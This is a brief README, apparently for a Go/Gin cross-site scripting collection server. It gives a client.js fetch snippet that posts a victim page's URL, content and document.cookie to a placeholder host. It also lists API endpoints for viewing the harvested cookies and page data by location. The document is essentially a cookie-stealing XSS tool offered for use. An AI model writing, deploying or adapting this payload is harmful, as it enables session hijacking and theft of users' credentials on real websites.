### XSS Handling
template Gin to routing js file handling

1. Enable sqlite3
```
apt-get install sqlite3
```

2. Have file client.js to handle xss

Here u post data with fetch like
```
fetch("https://xxx/content", {
					body: "url=" + x + "&content=" + x+ "&cookie:"+document.cookie,
					headers: {
						"Content-Type": "application/x-www-form-urlencoded"
					},
					method: "POST"
				})
```
3. Access API to check
```
https://x/print/locations -> all localtions
https://x/print/content?location=???? -> data content and cookie of localtion
```

### How to use
```
xss.Run("client.js")
```
